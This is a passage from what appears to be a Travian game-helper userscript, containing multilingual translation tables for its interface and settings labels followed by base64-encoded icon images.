		method : "Método",
		audiourl : "URL del archivo de audio",
		audiotest : "prueba del audio",
		colorCustomize : "Opciones de colores",
		colorHint : "dejar en blanco para el color por defecto",
		color0 : "mejora disponible",
		color1 : "mejorar mediante NPC",
		color2 : "Mejora imposible <br/>(Recursos insuficientes)",
		color3 : "Mejora imposible <br/>(Capacidad de granero o almacenes insuficiente)",
		color4 : "Máximo nivel"
	},
	zh: {// Chinese (Taiwan) (tw and cn and hk) translation. atg008782
		// 遊戲訊息(ingame messages)
		ok : "確定",
		cancel : "取消",
		close : "關閉",
		overview : "村莊預覽",
		svers : "腳本版本",
		settings : "設定",
		notes : "筆記",
		res90 : "資源 % 上限",
		refresh : "刷新",
		warehouse : "倉庫",
		resources : "資源",
		troops : "部隊",
		links : "連結",
		linkname : "名稱連結",
		linkdel : "刪除連結",
		name2 : "第二名稱",
		archive : "存檔",
		arena : "競技場",
		addcur : "添加",
		del : "刪除",
		edit : "編輯",
		unfix : "未修復",
		fix : "修復",
		total : "總數",
		noplace : "沒有空位!",
		hunger : "飢餓",
		duration : "時間",
		deficit : "紅字",
		aclock : "警報時間\nhh:mm:ss , hh:mm , mm (從現在起)",
		consnegat : "在這個村莊的儲存量是負的. 剩下儲存量多少分鐘?",
		searchlast : "搜索最後一個",
		bmove : "移動建築",
		// 設定(settings)
		none : "無",
		auto : "自動",
		info : "訊息",
		yourrace : "你的種族",
		speedart : "伺服器倍速",
		racelist : ['羅馬','條頓','高盧'],
		cranny : "黃色警戒線 (百分比)",
		crannyh : '一般 80, 70 經典或藝術品加成',
		builtin : "置入工具",
		builtinh : '產量欄顯示：紅色-為缺乏的資源，綠色-為不缺乏的資源',
		normalize : '標準生產',
		normal : "一般",
		banalyze : "置入戰鬥分析器",
		cropfind : "置入搜田器",
		adetect : "攻擊檢測",
		adetecto : ['關閉','w/o停止','開啟'],
		adetecth : "使用隱藏功能違反遊戲規則可能會導致懲罰.",
		adetectt : "檢測攻擊時間",
		buildhint : "建設提示",
		onallp : "全部頁面",
		dontwrap : "不換頁",
		dontwraph : '下拉式村莊列表',
		buildand : "顯示建設和攻擊倒數計時",
		buildandh : '村內列表',
		sendres : "顯示 資源/部隊 傳輸圖示",
		sendmess : "顯示傳送訊息圖示 ",
		analyzer : "世界分析",
		bigicon : "顯示大圖示",
		addvtable : "額外顯示村莊列表",
		addvtableo : ['關閉','開啟','固定'],
		addvtableh : '支援 travian 4',
		opennote : "自動開啟筆記",
		notesize : "筆記視窗尺寸",
		openoview : "自動開啟村莊預覽",
		resbar : "資源欄",
		showres : "顯示資源欄視窗",
		redbl : "紅(每小時)",
		yellowbl: "黃(每小時)",
		marketpl : "市場",
		mfilter : "過濾",
		mfiltero : ['關閉','只有比率','只有過濾','全部'],
		npcsum : "電腦商人交易(NPC)",
		npcsumh : '在市場與建築',
		bidinc : "拍賣加價",
		bidinch : ' travian 4 拍賣',
		show3x : "可能顯示不正確的數據",
		show3xh : '嘗試預測在 3倍 和 2倍 的資源傳輸',
		rpandmp : "集結點 與 市場",
		incomres : "資源傳輸信息",
		incomreso : ['關閉','開啟','電腦交易','奇觀模式'],
		troopsI : "部隊訊息",
		troopsIo : ['關閉','開啟','掃描幫助'],
		defRP : "默認集結點",
		showls : "顯示鏈接",
		showAsSN : "使用第二名稱",
		showlso : ['關閉','開啟','視窗顯示'],
		savedls : "儲存鏈接",
		savedd : "儲存數據",
		saveddh : '電腦不是你的如果要刪除,刪除項目會包含鏈接和第二名稱',
		savedelall : "全部儲存數據刪除",
		savedelallh : '你確定要刪除所有數據，包括鏈接和第二名稱嗎？',
		scrlang : "腳本語言",
		youlang : "你的語言",
		notifi : "通報",
		notification : "建設完成通報",
		method : "方式",
		audiourl : "音樂網址",
		audiotest : "播放音樂"
	},
	tr: { // Turkish language. xpugur
		// ingame messages
		ok : "Tamam",
		cancel : "iptal",
		close : "Kapat",
		overview : "Köylerin genel görünümü",
		svers : "kod versiyonu",
		settings : "ayarlar",
		notes : "notlar",
		res90 : "kaynaklar doluyor % ",
		refresh : "yenile",
		warehouse : "Depo",
		resources : "Kaynaklar",
		troops : "Askerler",
		links : "Bağlantılar",
		linkname : "bağlantı adı",
		linkdel : "bağlantıyı sil",
		name2 : "ikinci ad",
		archive : "Arşiv",
		arena : "Turnuva alanı",
		addcur : "mevcutu ekle",
		del : "sil",
		edit : "ayarla",
		unfix : "düzeltme",
		fix : "düzelt",
		total : "Toplam",
		noplace : "Yer yok!",
		hunger : "açlık",
		duration : "süre",
		deficit : "eksiklik",
		aclock : "Alarm saati\nhh:mm:ss , hh:mm , mm (şuandan itibaren)",
		consnegat : "Bu köyde tüketim eksilerde. Kaç dakika gerekiyor rezervlerin dolması için?",
		searchlast : "Sonuncuyu arayın",
		bmove : "Binaları taşı",
		// settings
		none : "Yok",
		auto : "otomatik",
		info : "Bilgi",
		yourrace : "Irkın",
		speedart : "Hız eseri",
		racelist : ['Romanlılar','Cermenler','Galyalılar'],
		cranny : "sığınak sarı seviyesi (yüzde)",
		crannyh : 'normal 80, klasik veya eser yağması için 70 ',
		builtin : "Entegre araçlar",
		builtinh : 'Üretimi normalleştirmek için: kırmızı renk - en gerekli kaynak, yeşil - en az gerekli kaynak',
		normalize : 'Üretimi normalleştirmek için',
		normal : "normal",
		banalyze : "Dahili savaş analizcisi",
		cropfind : "Dahili tarla bulucu",
		adetect : "Saldırıları algıla",
		adetecto : ['kapa','w/o dondur','aç'],
		adetecth : "Server a gizli istekler gönderir, kural ihlalidir. Ceza gelebilir.",
		adetectt : "saldırı algılama zaman aralıkları",
		buildhint : "inşaat ipuçları",
		onallp : "Tüm sayfalar",
		dontwrap : "Sayfaları birleştirme",
		dontwraph : 'köy listeleri sayfa atlarsa',
		buildand : "inşaat gerisayımını ve saldırıları göster",
		buildandh : 'Köy listelerinde',
		sendres : "işaretleri göster: ?send resource/troops? ",
		sendmess : "işaretleri göster: ?send message? ",
		analyzer : "Dünya analizcisi",
		bigicon : "Büyük simgeler göster",
		addvtable : "Ek köy tablosunu göster",
		addvtableo : ['kapa','aç','sabitle'],
		addvtableh : 'travian4 için',
		opennote : "Otomatik olarak notları aç",
		notesize : "Notlar için pencere boyutu",
		openoview : "Otomatik olarak köylerin genel görüşünü aç",
		resbar : "Kaynaklar çubuğu",
		showres : "Kaynaklar çubuğunu pencerede göster",
		redbl : "kırmızı (saat olarak)",
		yellowbl: "sarı (saat olarak)",
		marketpl : "Market",
		mfilter : "filtre",
		mfiltero : ['kapa','sadece oran','sadece filtre','dolu'],
		npcsum : "NPC için özet",
		npcsumh : 'binalarda ve markette',
		bidinc : "teklif arttır",
		bidinch : 'travian4 açık-arttırmaları için',
		show3x : "yanlış veri gösterebilir",
		show3xh : '3x ve 2x ile gönderilen kaynak akışını tahmin etmeye çalış',
		rpandmp : "Marketteki git-gel noktası",
		incomres : "gelen kaynak bilgisi",
		incomreso : ['kapa','aç','özetle','WW modu'],
		troopsI : "Askerler hakkında bilgi",
		troopsIo : ['kapa','aç','yardım ara'],
		defRP : "git-gel noktası için standart hareket",
		showls : "Bağlantıalrı göster",
		showAsSN : "Bağlantıları ikinci isim olarak kullan",
		showlso : ['kapa','aç','pencerede'],
		savedls : "kaydedilmiş bağlantılar",
		savedd : "kaydedilmiş veriler",
		saveddh : 'bağlantılar ve ikinci ismi içeren. Hesap silindiyse, yada kendi bilgisayarınız değilse.',
		savedelall : "kaydedilmiş tüm verileri sil",
		savedelallh : 'ikinci isim ve bağlantıları içeren, tüm verileri silmekte emin misiniz?',
		scrlang : "Kod dili",
		youlang : "Kendi diliniz",
		notifi : "bilgilendirmeler",
		notification : "inşaattan sonra bilgilendirmeler",
		method : "method",
		audiourl : "ses dosyasının URL si",
		audiotest : "test sesi"
	},
	vi: { // VietNamese translation by Nguyễn Duy Thanh
		// ingame messages
		ok : "Đồng ý",
		cancel : "Huỷ bỏ",
		close : "Đóng",
		overview : "tổng quan làng",
		svers : "Phiên bản scripts(translator thanhgola):",
		settings : "Cài đặt",
		notes : "ghi chú",
		res90 : "Tài nguyên cần để đầy %",
		refresh : "làm tươi",
		warehouse : "nhà kho",
		resources : "Tài nguyên",
		troops : "Lính",
		links : "Liên kết",
		linkname : "tên liên kết",
		linkdel : "xoá liên kết",
		name2 : "tên phụ",
		archive : "Lưu trữ",
		arena : "Võ đài",
		addcur : "thêm liên kết hiện tại",
		del : "xoá",
		edit : "sửa",
		unfix : "gỡ",
		fix : "sửa",
		total : "Tổng",
		noplace : "Không có chỗ!",
		hunger : "đói",
		duration : "Thời gian",
		deficit : "Thâm hụt",
		aclock : "Đồng hồ báo\nhh:mm:ss , hh:mm , mm ( tính từ bây giờ)",
		consnegat : "Mức tiêu thụ âm. Cần bao nhiêu phút để dự trữ?",
		searchlast : "Tìm kiếm lần cuối",
		bmove : "Dời công trình",
		// settings
		none : "Không",
		auto : "tự động",
		info : "Thông tin",
		yourrace : "Chủng tộc của bạn",
		speedart : "Cỗ xe của Helios",
		racelist : ['Romans','Teutons','Gauls'],
		cranny : "Báo màu vàng khi ống tài nguyên đạt (%)",
		crannyh : 'thông thường là 80, 70 cho làng bình thường hoặc làng có Bình rượu của Dionysus',
		builtin : "Công cụ công trình",
		builtinh : 'Chuẩn hoá sản lượng tài nguyên: màu đỏ -loại tài nguyên cần nhất, màu xanh - loại tài nguyên ít cần',
		normalize : 'Chuẩn hoá sản lượng tài nguyên',
		normal : "chuẩn",
		banalyze : "Chức năng - phân tích trận chiến",
		cropfind : "Chức năng - tìm làng nhiều ruộng lúa",
		adetect : "Phát hiện tấn công",
		adetecto : ['tắt','w/o mặc định','mở'],
		adetecth : "ẩn các hành vi có thể dẫn đến hình phát",
		adetectt : "Thời gian phát hiện tấn công",
		buildhint : "Mẹo xây dựng",
		onallp : "Tất cả trang",
		dontwrap : "Đừng ngắt trang",
		dontwraph : 'nếu danh sách trang quá dài',
		buildand : "Hiển thị thời gian xây dựng và tấn công",
		buildandh : 'Trong danh sách làng',
		sendres : "Hiện biểu tượng «Gửi tài nguyên/Gửi lính»",
		sendmess : "Hiện biểu tượng <<gửi>>",
		analyzer : "Phân tích thế giới",
		bigicon : "Hiện biểu tượng BIG",
		addvtable : "Hiển thị danh sách làng bổ sung",
		addvtableo : ['tắt','mở','dính'],
		addvtableh : 'Cho travian 4',
		opennote : "Tự động mở ghi chú",
		notesize : "Kích thước của sổ ghi chú",
		openoview : "Tự động mở tổng quát làng",
		resbar : "Thanh tài nguyên",
		showres : "Hiện thanh tài nguyên trên cửa sổ",
		redbl : "Đỏ (giờ)",
		yellowbl: "Vàng (giờ)",
		marketpl : "Khu chợ",
		mfilter : "Bộ lọc",
		mfiltero : ['tắt','chỉ tỉ lệ','chỉ bộ lọc','đầy đủ'],
		npcsum : "Tóm tắt cho NPC",
		npcsumh : 'chợ và công trình',
		bidinc : "Tăng đấu giá",
		bidinch : 'đấu giá của travian4',
		show3x : "Có thể hiện thị dữ lệu không chính xác",
		show3xh : 'cố gắn dự đoán các luồn tài nguyên sever 2x và 3x đang gửi',
		rpandmp : "Binh trường và chợ",
		incomres : "Thông tin tài nguyên đang đến",
		incomreso : ['tắt','mở','với tóm tắt','chế độ WW'],
		troopsI : "Thông tin về quân đội",
		troopsIo : ['tắt','mở','tìm trợ giúp'],
		defRP : "Hành động mặt định khi gửi lính",
		showls : "Hiện liên kết",
		showAsSN : "Sử dụng liên kết như tên phụ",
		showlso : ['tắt','mở','trong cửa sổ'],
		savedls : "Lưu liên kết",
		savedd : "Liên kết đã lưu",
		saveddh : 'gồm liên kết và liên kết phụ. Nếu tài khoảng xoá hoặc đây không phải máy tính của bạn.',
		savedelall : "xoá tất cả dữ liệu đã lưu",
		savedelallh : 'bạn có chắc muốn xoá hết dữ liệu, bao gồm cả liên kết và tên phụ cuả nó?',
		scrlang : "Ngôn ngữ Script",
		youlang : "Ngôn ngữ của bạn",
		notifi : "Thông báo",
		notification : "thông báo sau khi xây dựng xong",
		method : "Phương pháp",
		audiourl : "URL của tệp nhạc",
		audiotest : "Thử nhạc",
		neighbors : "Tìm kiếm",
		colorCustomize : "Cài đặt màu sắc",
		colorHint : "Để trống để cho màu mặc định",
		color0 : " Sẵn sàn nân cấp ",
		color1 : "Nân cấp thông qua NPC",
		color2 : "Không thể nân cấp<br>(do không đủ tài nguyên)",
		color3 : "không thể nân cấp<br>(do nhà kho/ kho lúa không đủ sức chứa)",
		color4 : "Hoàn thành nân cấp"
	},
	el: {// Greek translation by Tasos el malo
		// ingame messages
		ok : "εντάξει",
		cancel : "ακύρωση",
		close : "κλείσε",
		overview : "επισκόπηση χωριών",
		svers : "έκδοση script",
		settings : "ρυθμίσεις",
		notes : "σημειώσεις",
		res90 : "πόροι για την πλήρωση %",
		refresh : "ανανέωση",
		warehouse : "αποθήκη",
		resources : "πόροι",
		troops : "στρατεύματα",
		links : "σύνδεσμοι",
		linkname : "όνομα συνδέσμου",
		linkdel : "διαγραφή συνδέσμου",
		name2 : "2ο όνομα",
		archive : "αρχείο",
		arena : "πλατεία αθλημάτων",
		addcur : "προσθήκη τρέχουσας",
		del : "διαγραφή",
		edit : "επεξεργασία",
		unfix : "unfix",
		fix : "fix",
		total : "σύνολο",
		noplace : "δεν υπάρχει χώρος!",
		hunger : "πείνα",
		duration : "διάρκεια",
		deficit : "έλλειμμα",
		aclock : "ρολόι συναγερμός\nhh:mm:ss , hh:mm , mm (από τώρα)",
		consnegat : "Η κατανάλωση στο χωριό είναι αρνητική. πόσα λεπτά χρειάζεται απόθεμα?",
		searchlast : "αναζήτησε το τελευταίο",
		bmove : "μετακίνησε κτίρια",
		neighbors : "γείτονες",
		// settings
		none : "κανένα",
		auto : "αυτόματο",
		info : "πληροφορίες",
		yourrace : "η φυλή σου",
		speedart : "ταχύτητα αντικειμένου",
		racelist : ['Ρωμαίοι','Τεύτονες','Γαλάτες'],
		cranny : "κίτρινο επίπεδο κρυψώνας (ποσοστό)",
		crannyh : 'κανονικό 80, 70 για κλασικό ή αντικείμενο λεηλασίας',
		builtin : "Ενσωματωμένα εργαλεία",
		builtinh : 'για ομαλοποίηση παραγωγής: κόκκινο χρώμα - μεγαλύτερη ανάγκη πόρων, πράσινο - λιγότερη ανάγκη πόρων',
		normalize : 'ομαλοποίηση παραγωγής',
		normal : "κανονικό",
		banalyze : "ενσωματωμένος αναλυτής μάχης",
		cropfind : "ενσωματωμένη εύρεση πολυσιταρων",
		adetect : "εντοπισμός επίθεσης",
		adetecto : ['ανενεργό','χωρίς ακινητοποίηση','ενεργό'],
		adetecth : "κάνει κρυφά αιτήματα στον εξυπηρετητή, παραβιάζοντας τους κανόνες. μπορεί να οδηγήσει σε τιμωρία.",
		adetectt : "περίοδος εντοπισμού επίθεσης",
		buildhint : "συμβουλή κατασκευής",
		onallp : "όλες οι σελίδες",
		dontwrap : "Μην αναδηπλώσεις σελίδες (αργά)",
		dontwraph : 'Εάν η λίστα παρακάμπτει τα χωριά προς τα κάτω',
		buildand : "εμφάνιση αντίστροφης μέτρησης κτιρίου και επίθεσης",
		buildandh : 'στην λίστα των χωριών',
		sendres : "εμφάνισε «στείλε ύλες/στρατεύματα» εικονίδια",
		sendmess : "εμφάνισε «στείλε μήνυμα» εικονίδιο",
		analyzer : "World analyzer",
		bigicon : "εμφάνισε μεγάλα εικονίδια",
		addvtable : "Εμφάνιση επιπλέον πίνακα χωριών",
		addvtableo : ['ανενεργό','ενεργό','κολλημένο'],
		addvtableh : 'για travian4',
		opennote : "άνοιξε αυτόματα σημειωματάριο",
		notesize : "μέγεθος παράθυρου σημειωματάριου",
		openoview : "άνοιξε αυτόματα την εμφάνιση χωριών",
		resbar : "μπάρα πόρων",
		showres : "εμφάνισε την μπάρα πόρων σε παράθυρο",
		redbl : "κόκκινο (σε ώρες)",
		yellowbl: "κίτρινο (σε ώρες)",
		marketpl : "Αγορά",
		mfilter : "Φίλτρο",
		mfiltero : ['ανενεργό','μόνο ποσοστό','μόνο φίλτρο','πλήρες'],
		npcsum : "σύνολο για NPC",
		npcsumh : 'στην αγορά και στα κτίρια',
		bidinc : "ανέβασε προσφορά",
		bidinch : 'για περιπέτειες travian4',
		show3x : "μπορεί να εμφανίζει λανθασμένα δεδομένα",
		show3xh : 'πρόβλεψη ροής των πόρων σε 3x και 2x αποστολή',
		rpandmp : "πλατεία συγκέντρωσης και αγορά",
		incomres : "πληροφορίες εισερχόμενων πόρων",
		incomreso : ['ανενεργό','ενεργό','με σύνολο','για θαύμα'],
		troopsI : "πληροφορίες για τα στρατεύματα",
		troopsIo : ['ανενεργό','ενεργό','βοήθεια σάρωσης'],
		defRP : "προεπιλεγμένη ενέργεια για την πλατεία συνέλευσης",
		showls : "εμφάνισε συνδέσμους",
		showAsSN : "χρησιμοποίησε συνδέσμους ως δεύτερο όνομα",
		showlso : ['ανενεργό','ενεργό','σε παράθυρο'],
		savedls : "αποθηκευμένοι σύνδεσμοι",
		savedd : "αποθηκευμένα δεδομένα",
		saveddh : 'συμπεριλαμβανομένων των συνδέσμων και του δεύτερου ονόματος. Αν ένας λογαριασμός διαγραφεί, ή όχι ο υπολογιστής σας.',
		savedelall : "διαγραφή όλων των αποθηκευμένων δεδομένων",
		savedelallh : 'Είστε σίγουρος ότι θέλετε να διαγράψετε όλα τα δεδομένα, συμπεριλαμβανομένων των συνδέσμων και το δεύτερο όνομα?',
		scrlang : "γλώσσα Script",
		youlang : "η γλώσσα σου",
		notifi : "ειδοποίηση",
		notification : "ειδοποίηση μετά την κατασκευή",
		method : "μέθοδος",
		audiourl : "URL για αρχείο ήχου",
		audiotest : "δοκιμή ήχου",
		colorCustomize : "επιλογές χρωμάτων",
		colorHint : "άφησε κενό για προεπιλεγμένο χρώμα",
		color0 : "διαθέσιμη αναβάθμιση",
		color1 : "αναβάθμιση μεσώ NPC",
		color2 : "αναβάθμιση δεν είναι δυνατή <br/>(όχι αρκετοί πόροι)",
		color3 : "αναβάθμιση δεν είναι δυνατή <br/>(όχι αρκετή χωρητικότητα αποθηκών/σιταποθηκών)",
		color4 : "ανώτατο επίπεδο"
	},
	nl: {
		// ingame messages
		ok : "Ok",
		cancel : "Annuleren",
		close : "Sluiten",
		overview : "dorpen overzicht",
		svers : "script versie",
		settings : "instellingen",
		notes : "notities",
		res90 : "grondstoffen voor tot % vullen",
		refresh : "herlaad",
		warehouse : "Warenhuis",
		resources : "Grondstoffen",
		troops : "Troepen",
		links : "Links",
		linkname : "link naam",
		linkdel : "verwijder link",
		name2 : "tweede naam",
		archive : "Archiveer",
		arena : "Toernooiveld",
		addcur : "Voeg huidige toe",
		del : "verwijder",
		edit : "wijzig",
		unfix : "losmaken",
		fix : "vastzetten",
		total : "Totaal",
		noplace : "Er is geen plaats!",
		hunger : "honger",
		duration : "duur",
		deficit : "tekort",
		aclock : "Alarmklok\nhh:mm:ss , hh:mm , mm (van nu)",
		consnegat : "Consumptie in dit dorp is negatief. Hoeveel minuten reserve nodig?",
		searchlast : "Zoek de laatste van",
		bmove : "Verplaats gebouwen",
		neighbors : "buren",
		// settings
		none : "Geen",
		auto : "automatisch",
		info : "Informatie",
		yourrace : "Jouw ras",
		speedart : "Snelheids artefact",
		racelist : ['Romeinen','Germanen','Galliërs'],
		cranny : "geel niveau van schuilplaats (procent)",
		crannyh : 'normaal 80, 70 voor klassieke servers of artefact plunderen',
		builtin : "Ingebouwde hulpmiddelen",
		builtinh : 'voor normalisatie van productie: rode kleur - meest benodigde grondstoffen, groen - minder benodigde grondstoffen',
		normalize : 'Normalisatie van productie',
		normal : "normaal",
		banalyze : "Ingebouwde gevechts analysator",
		cropfind : "Ingebouwde cropper zoeker",
		adetect : "Detecteer aanval",
		adetecto : ['uit','zonder stilzetten','aan'],
		adetecth : "maakt de verborgen verzoeken aan de server, overtreed de regels. kan in bestraffing resulteren.",
		adetectt : "periode van aanvals detectie",
		buildhint : "Tips voor constructie",
		onallp : "Alle pagina's",
		dontwrap : "Pagina's niet samenduwen",
		dontwraph : 'Als de dorpen lijst naar beneden springt',
		buildand : "Laat aftelling van gebouwen en aanvallen zien",
		buildandh : 'In de dorpen lijst',
		sendres : "Laat «stuur grondstoffen/troepen» iconen zien",
		sendmess : "Laat «stuur bericht» iconen zien",
		analyzer : "Wereld analysator",
		bigicon : "Laat GROTE iconen zien",
		addvtable : "Laat extra dorpen tabel zien",
		addvtableo : ['uit','aan','vastzetten'],
		addvtableh : 'voor travian4',
		opennote : "Automatisch notities openen",
		notesize : "Grootte van scherm voor notities",
		openoview : "Automatisch dorpen overzicht weergeven",
		resbar : "Grondstoffen balk",
		showres : "Laat grondstoffen balk zien in een los scherm",
		redbl : "rood (in uren)",
		yellowbl: "geel (in uren)",
		marketpl : "Marktplaats",
		mfilter : "filter",
		mfiltero : ['uit','alleen ratio','alleen filter','alles'],
		npcsum : "opsomming voor NPC",
		npcsumh : 'in marktplaats en gebouwen',
		bidinc : "bod toenemening",
		bidinch : 'voor travian4 veilingen',
		show3x : "kan incorrecte data weergeven",
		show3xh : 'probeer de grondstoffenstroom te voorspellen bij 3x en 2x versturen',
		rpandmp : "Verzamelnplaats en Marktplaats",
		incomres : "binnenkomende grondstoffen info",
		incomreso : ['uit','aan','met opsomming','WW modus'],
		troopsI : "Informatie over de troepen",
		troopsIo : ['uit','aan','scan hulp'],
		defRP : "standaard actie voor verzamelplaats",
		showls : "Laat links zien",
		showAsSN : "Gebruik links als tweede naam",
		showlso : ['uit','aan','in apart scherm'],
		savedls : "opgeslagen links",
		savedd : "opgeslagen data",
		saveddh : 'inclusief links en tweede naam. Voor als een account is verwijderd, of dit niet jouw pc is.',
		savedelall : "verwijder alle opgeslagen data",
		savedelallh : 'Weet je zeker dat je alle data wilt verwijderen, inclusief links en tweede naam?',
		scrlang : "Script taal",
		youlang : "jouw taal",
		notifi : "notificatie",
		notification : "notificatie na bouw",
		method : "methode",
		audiourl : "URL van geluidsbestand",
		audiotest : "test geluidsbestand",
		colorCustomize : "Kleuren opties",
		colorHint : "laat leeg voor standaard kleur",
		color0 : "verbetering beschikbaar",
		color1 : "verbetering via NPC",
		color2 : "verbetering niet beschikbaar <br/>(niet genoeg grondstoffen)",
		color3 : "verbetering niet beschikbaar <br/>(niet genoeg capaciteit van warenhuis of graansilo)",
		color4 : "laatste niveau"
	}
};

var img_igm = "data:image/gif;base64,R0lGODlhCwAIAIABAH9/f////yH5BAEKAAEALAAAAAALAAgAAAIUDI5oEO3L2ItSmnYw1bdTO31JVgAAOw==";
var img_car = "data:image/gif;base64,R0lGODlhEgAMAIQWAKuZY+DUr8q6iol4RWJTKPLpzPz79fn05sC2l9bNs8vCqdTOvOzm1dzTutvQsLWphrmvkdvVwuTdyKeacPr37efk2v///////////////////////////////////////yH5BAEAAB8ALAAAAAASAAwAAAVW4Cd+DTAQAjOua2CigMPO7hAIpjm3LkEAuEFlJyoUfrbgYkcpBAa4mwkyMxhdN+lgEGEdnNmA1ITwgsXiIGHCMgjQN9zrMZMABfIXQbFLAP4mJwRlIiEAOw==";
var img_def = "data:image/gif;base64,R0lGODlhEgAMAOMMAHJWAIpQAIFhAIxyH5l6AMeLAL2fAJmusNWzANStcOjMANDh4////////////////yH5BAEKAA8ALAAAAAASAAwAAARP8MmzpLXrXLkI+OBHVBtAEIahKOkJbI+JqqzhwnK6th48nLraaQBDmIItAAJWEMx2NkEB9igAkAbAFJYICLCCQGLT7V53ALH4spaELF1JBAA7";
var img_att = "data:image/gif;base64,R0lGODlhEgAMAIQeALzO0P/SAIGXmeTLptStcPL390RSU5R4TdXEqMLU1ujw8dClY6a0tt7AXIaNjnqLjeTHXL/S1IVRAMGymeXSmbt+IK/CxGU+AJmusOO2AN7q672OAHGIitDh4////////yH5BAEKAB8ALAAAAAASAAwAAAVX4Cd+QDeeXwegqaCwimCyiXx2NisC3KxxK93IwtFoBBYhiiPgYJQiSubzw3A+GYqQsgl0rIbARiusbKYfcUVJkFzOmc1FsmYNKhdRAyKaD1gIB0ITCCIhADs=";
var img_pref = "data:image/gif;base64,R0lGODlhEAAMAOMJAAAzZjMzmTNmmWZmzGaZzJmZmZnMmczMmczMzP///////////////////////////yH5BAEKAA8ALAAAAAAQAAwAAARB8ElAgbyvFPwAQtZVIFo3JaBInlSChiUGuDQYc1WbclcQaLMdJ0Ag/HShXlFgPAmJBMEgIHtJoE2c9SHo8iaURwQAOw==";
var img_refr = "data:image/gif;base64,R0lGODlhEAAQAOMKACtVgCtVqiuAqlWAqlWA1ICAqoCqqoCq1Kqq1KrU1P///////////////////////yH5BAEKAA8ALAAAAAAQABAAAARW8MkHap14ghCGD4CmcV5xnFZIbVaHvMOhtuOBJMkMEEEGnIhZRgIYJG6q4SqlYyqJL8QgiZklUJnAYUo8ImRJwXQmfW2ZFwoIYDgUPpxkugIHVX0pTAQAOw==";
var img_view = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAQAAADIBVVwAAAAAXNSR0IArs4c6QAAAPBJREFUGNNtkbEuBFEYhb+ZSHYjSgoFQaFbmSdQiWSbfYN5HYVWo9No9IqNeINtRYNssjRsITFEYu3/KWbGDNlTneLcc+/9DgCquZlL7zzl/he1yhgeh2pfxi4KV2ZyrRGqZmaqdt21Y31D1bfvV4QaGjdBkctboX56WEUpO47qOkNdn/N6Oi/9ZdWPajo9//OigcRLeTAe3JiqprQk8FjZFZ4Bki6xDJAC7K1OUEgYsUmf22B2wI53wJi1JthjyDcCJ8DQ+4+8M5qRFIYX9BqKNR49EzFTM7e8clB95ZdkDTzcbgHPG4rtbcoJMxfuwg8RxTrpF3oYEQAAAABJRU5ErkJggg==";
var img_del = "data:image/gif;base64,R0lGODlhEAAMAIABAP8AAP///yH5BAEKAAEALAAAAAAQAAwAAAIfTICmu5j8lAONMuOwvTLzun3HJI5WBKGotrYrlpZBAQA7";
var img_edit = "data:image/gif;base64,R0lGODlhEAAMAKEAAP///3HQAHV8bf///yH5BAEKAAMALAAAAAAQAAwAAAIinH+iyBnyGoIwREntE/hpilUe11QZWX5X+qEl5b6LNMVSAQA7";
var img_notes = "data:image/gif;base64,R0lGODlhEAAMAIQcAAAkkrYkANskAG1JAElJbf8kAJJJAABt29tJJJJtAG1tbW1tkrZtAACS/ySS222SkpKSkpKSttuSALa2tra227bb27bb///bSdvb2//b/9v/////2////////////////yH5BAEKAB8ALAAAAAAQAAwAAAVq4PdJIjmWoghFTMS6LcsJwfdwBofruX4UGcSNQOEQjcWDhVMI3HRQqFLjaD6jPgu1AfgsOJhwmDN1cEVfbEJrBkzQnIq8wklc2hyFSKHebC4AOnoffBSGdRsDA1CDBAqPChMDCRMTkAQiIQA7";
var img_save = "data:image/gif;base64,R0lGODlhLgAUAKUoAAAAABw5OTk5ORw5qjk5VTk5cTk5jjk5qhxVqjlVjlVVVTlVqlVVcTlVxlVVjlVVqlVVxlVxjlVxxnFxjnFxxnFx445xxo5x43GOjo6O446O/6qO46qO/3HGAKqqxqqq46qq/8aq/8bGxsbG48bG/8bj4+Pj4+P//////////////////////////////////////////////////////////////////////////////////////////////////yH5BAEKAD8ALAAAAAAuABQAAAb+wJ/w1ykaj8ikclkcDouoqHRKrVqv0aawg+16v53tN/opmzeZdMZCoYxRYe77Q9JYT5DH422CzkkZVScmDQR7Y31yY3SBU4MmCxeHX4lvKHQVjiYmJQsUk16VbxskblGPJSMDEqBYm35jGSQSp5upqhAOiKKxISAQwA0LCwMDwAm7sF8ZIM1qF23AD8iUvCfX2NnXFs4M3t4ReQsG2uXXr3Lm5RQgaQwAAiUlEcMH5OrYm5X6/P2bFBzcCZiwCcOBgwb8KTQhoshChRTSIAjgwYMIEQoOHijwsF9DIh35TWCl54GDBAkMqCzAMSTDMCBdypR58eOWDjVz6tzJs6cKTi1OmAgdusRJEAA7";
var img_underline = "data:image/gif;base64,R0lGODlhFwAQAIABAODg4AAAACH5BAEAAAEALAAAAAAXABAAQAIVjI+py+0Po5y02ouz3rxjAIbiSIIFADs=";
var img_stat = "data:image/gif;base64,R0lGODlhMQAxAKUtADdJkklJpFtbW0lbpFtbpFtbtm1tbW1tgFtttm1tklttyG1tpG1ttm1tyG2ApICAgG2AyICAkm2A24CApICAtoCA24CA7ZKSkpKSpICS7YCS/5KS25KS7ZKS/6SkpJKk7ZKk/6Sk7aSk/6S2tra2tra2yKS2/7a2/8jIyLbI/9vb29vb7e3t7f///////////////////////////////////////////////////////////////////////////yH5BAEAAD8ALAAAAAAxADEAAAb+wJ9wSCwKWy0WCkXyeC5O0pLVMlqv2F+Seel6v14pNUsutlQosHp9QamQ5axS/Xh06/i6GjWOG1UkawICXYOGg3ZgJG9+Q2dPbJGRHox+j5KYbJRVcSqQbAYGXaGkpaYGdptlnph6F3mwsYmqWYGZt5EkfVZpuL5rKJxGLLiho6fIpxcqVi29ma6y0rBtwkfEv9lrLGbP2t9tZrYXEwUDCaCiF8mliWskwkldEwQBEh0FEWvR03iSzEfSFLDXoWCGAfrAZQp2hMSAABkKSswQYB6FBuYCBAAAIMCAAQUaUIjQz101LSxASlzZQQLIAAUUSJCQISKIDhksSMAIc8H+gUOH1F2Ap4WCApYsXRa4txKE06cgRHSooGAAAwySPCBpUYBBAwRgETSgmUFDy48RC0J9KqJtWw4YKUzaCrKBXbthxY49GEDDWrZuRZgYzAHBVTZ0Q95dvHimx79RAw8efMIEhMNgtCIhoJixZ7sKCkAN3HayiROoT0CQmznx3Y8aN3os0Jn2B6ekTadGHYLABEVbOdulvVJDBglVNS4190Gy7t0nUlRgYDIYkgWxCSLt4LRlgwEACjQvPRl69BQfClQ/sqLEgQN9kf51m6ECecrmU6Q4EQCVF25DEGNAAPLN59xzqemnYH+JEEUECQ8AkJZaBh5o3nkKngCAfyf+EaHCBRJSuBZpgiGImoIoh